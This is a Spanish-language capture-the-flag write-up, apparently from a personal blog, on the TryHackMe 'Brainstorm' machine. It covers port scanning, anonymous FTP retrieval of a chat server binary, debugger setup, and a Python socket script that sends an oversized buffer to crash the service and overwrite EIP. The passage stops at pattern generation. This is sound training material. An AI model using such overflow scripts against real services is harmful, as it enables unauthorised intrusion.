<!DOCTYPE html>
<html class="" lang="en"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            Brainstorm [TryHackMe]  &ndash;
        
        K3ssDev
:/var/log$  
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
<meta name="author" content="Alberto Pérez" />

    
        <meta name="keywords" content='Buffer Overflow, Exploit Development, Immunity Debugger, Medium, Metasploit, Meterpreter, Mona, Privilege Escalation, Python, Reverse Shell, TryHackMe, Windows' />
    
    
        <meta name="description" content="orm es una máquina virtual vulnerable de TryHackMe con un nivel de dificultad media. El objetivo es obtener acceso a la máquina y obtener el flag root.txt. Forma parte del learning path de Offensive Pentesting Path, y está dentro del bloque de &amp;ldquo;Buffer Overflow&amp;rdquo;, por lo que el objetivo es explotar un buffer overflow en una aplicación vulnerable para obtener acceso a la máquina." />
    

<meta property="og:site_name"
    content='K3ssDev
:/var/log$  ' />

    <meta property="og:title" content="Brainstorm [TryHackMe]" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="Alberto Pérez" />
    <meta
        property="article:published_time"
        content='2023-10-01T00:00:00Z&#43;0000' />
    
        
            <meta property="article:tag" content="Buffer Overflow" />
        
            <meta property="article:tag" content="Exploit Development" />
        
            <meta property="article:tag" content="Immunity Debugger" />
        
            <meta property="article:tag" content="Medium" />
        
            <meta property="article:tag" content="Metasploit" />
        
            <meta property="article:tag" content="Meterpreter" />
        
            <meta property="article:tag" content="Mona" />
        
            <meta property="article:tag" content="Privilege Escalation" />
        
            <meta property="article:tag" content="Python" />
        
            <meta property="article:tag" content="Reverse Shell" />
        
            <meta property="article:tag" content="TryHackMe" />
        
            <meta property="article:tag" content="Windows" />
        
    
    <meta property="og:url" content="https://k3ssdev.github.io/posts/brainstorm/" />
    <meta property="og:image"
        content='https://k3ssdev.github.io/images/post_pics/brainstorm/brainstorm.jpeg
        ' />
    
        <meta property="og:description" content="Introducción Brainstorm es una máquina virtual vulnerable de TryHackMe con un nivel de dificultad media. El objetivo es obtener acceso a la máquina y obtener el" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='k3ssdev.github.io'
/>
<meta property="twitter:url" content="https://k3ssdev.github.io/posts/brainstorm/" />


    <meta name="twitter:title" content="Brainstorm [TryHackMe]" />
    
    <meta name="twitter:image"
        content='https://k3ssdev.github.io/images/post_pics/brainstorm/brainstorm.jpeg
        ' />
    
        <meta name="twitter:description" content="Introducción Brainstorm es una máquina virtual vulnerable de TryHackMe con un nivel de dificultad media. El objetivo es obtener acceso a la máquina y obtener el" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">K3ssDev
:/var/log$  </a>
                        
                    </h1>
                    
                        <label id="hamburger-menu" for="main-nav-toggler">
                            &#xf85b;
                        </label>
                    
                </div>
                <div id="wide_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="mailto:k3ssdev@proton.me">
    
    
        &#xf6ed;
    
    <span>
        Email
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
    
    
        &#xf0e1;
    
    <span>
        Linkedin
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/k3ssdev">
    
    
        &#xf09b;
    
    <span>
        Github
    </span>
</a>

    </div>
    
        <div id="sidebar_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
        
    
<script src="https://tryhackme.com/badge/1277295"></script>


</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>Brainstorm [TryHackMe]</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-10-01

</p>
    
    
    
        <figure style="margin: 0">
            <img src="/images/post_pics/brainstorm/brainstorm.jpeg" alt="" />
            
        </figure>
    
    
    <div><h2 id="introducción">Introducción</h2>
<p>Brainstorm es una máquina virtual vulnerable de <a href="https://tryhackme.com/room/brainstorm">TryHackMe</a> con un nivel de dificultad media. El objetivo es obtener acceso a la máquina y obtener el flag root.txt. Forma parte del learning path de <a href="https://tryhackme.com/paths">Offensive Pentesting Path</a>, y está dentro del bloque de &ldquo;Buffer Overflow&rdquo;, por lo que el objetivo es explotar un buffer overflow en una aplicación vulnerable para obtener acceso a la máquina. En este caso, la aplicación vulnerable es un servidor de chat que se ejecuta en Windows, por lo que primero se debe obtener el binario de la aplicación y analizarlo con Immunity Debugger para encontrar la vulnerabilidad y explotarla.</p>
<h2 id="escaneo-de-puertos">Escaneo de puertos</h2>
<p>Lo primero que haremos será escanear los puertos de la máquina con nmap para ver qué servicios están en ejecución y qué puertos están abiertos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial 10.10.211.15
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sun Sep 24 12:32:12 2023 as: nmap -sS --min-rate 5000 -p- -Pn -v -oN nmap_inicial 10.10.211.15</span>
</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.211.15 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">14</span> dropped probes since last increase.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.211.15
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.050s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>21/tcp   open  ftp
</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server
</span></span><span style="display:flex;"><span>9999/tcp open  abyss
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Sep 24 12:32:39 2023 -- 1 IP address (1 host up) scanned in 26.55 seconds</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p21,3389,9999 -sC -sV -Pn -oN nmap_final 10.10.211.15
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sun Sep 24 12:32:39 2023 as: nmap -p21,3389,9999 -sC -sV -Pn -oN nmap_final 10.10.211.15</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.211.15
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.049s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE       VERSION
</span></span><span style="display:flex;"><span>21/tcp   open     ftp           Microsoft ftpd
</span></span><span style="display:flex;"><span>| ftp-syst: 
</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
</span></span><span style="display:flex;"><span>3389/tcp filtered ms-wbt-server
</span></span><span style="display:flex;"><span>9999/tcp open     abyss?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   LANDesk-RC, NCP, NotesRPC, TerminalServer, WMSRequest, afp, giop, ms-sql-s, oracle-tns: 
</span></span><span style="display:flex;"><span>|     Welcome to Brainstorm chat <span style="color:#f92672">(</span>beta<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_    Please enter your username <span style="color:#f92672">(</span>max <span style="color:#ae81ff">20</span> characters<span style="color:#f92672">)</span>: Write a message:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port9999-TCP:V<span style="color:#f92672">=</span>7.94%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/24%Time<span style="color:#f92672">=</span>651010BD%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>LA
</span></span><span style="display:flex;"><span>SF:NDesk-RC,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20characters\):\x20Write\x20a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,63,<span style="color:#e6db74">&#34;Welcome\x20to
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Note
</span></span><span style="display:flex;"><span>SF:sRPC,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WMSRequest,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\x20chat\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20charac
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ters\):\x20Write\x20a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,63,<span style="color:#e6db74">&#34;Welcome\x20to\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>ms-sq
</span></span><span style="display:flex;"><span>SF:l-s,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ente
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Write\x20a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>giop,63,<span style="color:#e6db74">&#34;Welcome\x20to\x20Brainstorm\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20characters\):\x20Write\x20a\x20message:\x20&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Sep 24 12:35:50 2023 -- 1 IP address (1 host up) scanned in 191.22 seconds</span>
</span></span></code></pre></div><p>Como podemos ver, tenemos 3 puertos abiertos: 21, 3389 y 9999. El puerto 21 es el puerto del servicio FTP, el puerto 3389 es el puerto del servicio RDP y el puerto 9999 es el puerto del servicio Abyss Web Server.</p>
<h2 id="enumeración-del-servicio-ftp">Enumeración del servicio FTP</h2>
<p>Accedemos al servicio FTP con las credenciales anónimas que nos ha dado nmap y vemos que hay un archivo llamado &ldquo;chatserver.exe&rdquo; y un fichero dll. Lo descargamos y lo analizamos con Immunity Debugger.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp 10.10.18.125 -P <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Connected to 10.10.18.125.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Microsoft FTP Service
</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.18.125:k3ss<span style="color:#f92672">)</span>: anonymous
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Anonymous access allowed, send identity <span style="color:#f92672">(</span>e-mail name<span style="color:#f92672">)</span> as password.
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> User logged in.
</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
</span></span><span style="display:flex;"><span>ftp&gt; passive
</span></span><span style="display:flex;"><span>Passive mode: off; fallback to active mode: off.
</span></span><span style="display:flex;"><span>ftp&gt; binary
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> Type set to I.
</span></span><span style="display:flex;"><span>ftp&gt; ls
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
</span></span><span style="display:flex;"><span>08-29-19  08:36PM       &lt;DIR&gt;          chatserver
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span>ftp&gt; cd chatserver
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> CWD command successful.
</span></span><span style="display:flex;"><span>ftp&gt; ll
</span></span><span style="display:flex;"><span>?Invalid command.
</span></span><span style="display:flex;"><span>ftp&gt; ls
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
</span></span><span style="display:flex;"><span>08-29-19  10:26PM                <span style="color:#ae81ff">43747</span> chatserver.exe
</span></span><span style="display:flex;"><span>08-29-19  10:27PM                <span style="color:#ae81ff">30761</span> essfunc.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span>ftp&gt; mget .
</span></span><span style="display:flex;"><span>mget chatserver.exe <span style="color:#f92672">[</span>anpqy?<span style="color:#f92672">]</span>? y
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
</span></span><span style="display:flex;"><span>100% <span style="color:#f92672">||</span> <span style="color:#ae81ff">43747</span>      181.87 KiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">43747</span> bytes received in 00:00 <span style="color:#f92672">(</span>181.77 KiB/s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>mget essfunc.dll <span style="color:#f92672">[</span>anpqy?<span style="color:#f92672">]</span>? y
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span> Data connection already open; Transfer starting.
</span></span><span style="display:flex;"><span>100% <span style="color:#f92672">||</span> <span style="color:#ae81ff">30761</span>      160.83 KiB/s    00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">30761</span> bytes received in 00:00 <span style="color:#f92672">(</span>160.71 KiB/s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>ftp&gt; exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span> Goodbye.
</span></span></code></pre></div><h2 id="análisis-del-binario-con-immunity-debugger">Análisis del binario con Immunity Debugger</h2>
<p>Abrimos el binario con Immunity Debugger y vemos que se trata de un servidor de chat que se ejecuta en Windows. Lo primero que haremos será probar el servidor de chat para ver cómo funciona. Para ello, lo ejecutamos y nos conectamos con netcat al puerto 9999.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -nv 192.168.1.109 <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Connection to 192.168.1.109 <span style="color:#ae81ff">9999</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
</span></span><span style="display:flex;"><span>Welcome to Brainstorm chat <span style="color:#f92672">(</span>beta<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Please enter your username <span style="color:#f92672">(</span>max <span style="color:#ae81ff">20</span> characters<span style="color:#f92672">)</span>: k3ss
</span></span><span style="display:flex;"><span>Write a message: this is a test message
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Sun Oct <span style="color:#ae81ff">01</span> 17:45:03 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>k3ss said: this is a test message
</span></span></code></pre></div><p>Pruebo a enviar un mensaje con más de 20 caracteres y veo que el servidor lo corta. Pruebo a enviar un mensaje con 3000 caracteres y descubro que el servidor no lo corta, por lo que es vulnerable a un buffer overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c ´print <span style="color:#e6db74">&#34;A&#34;</span>*3000´
</span></span></code></pre></div><p>Preparo la carpeta de trabajo de Inmunity Debugger con el siguiente comando:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona config -set workingfolder c:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\%</span>p
</span></span></code></pre></div><p>Y ejecuto el servidor de chat con Inmunity Debugger. Una vez ejecutado, me conecto con netcat al puerto 9999 y envío un mensaje con 3000 caracteres. En Inmunity Debugger, veo que el programa se ha roto y que el registro EIP contiene 41414141, que son los caracteres &ldquo;AAAA&rdquo; en hexadecimal. Esto significa que el programa se ha roto en el registro EIP, por lo que el servidor de chat es vulnerable a un buffer overflow. Preparo un script python y lo ejecuto para ver cuántos caracteres se necesitan para sobreescribir el registro EIP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_ADDRESS&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3000</span>
</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(prefix <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Dentro del bloque del try tengo que replicar el comportamiento del servidor de chat, por lo que primero me conecto al servidor, luego recibo el mensaje de bienvenida, luego envío el nombre de usuario, luego recibo el mensaje de bienvenida y luego envío el mensaje con el buffer. Ejecuto el script y veo que el registro EIP se ha sobrescrito con 41414141, por lo que el servidor de chat es vulnerable a un buffer overflow. Ahora tengo que encontrar un patrón único para saber cuántos caracteres se necesitan para sobrescribir el registro EIP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_create -l <span style="color:#ae81ff">3000</span>
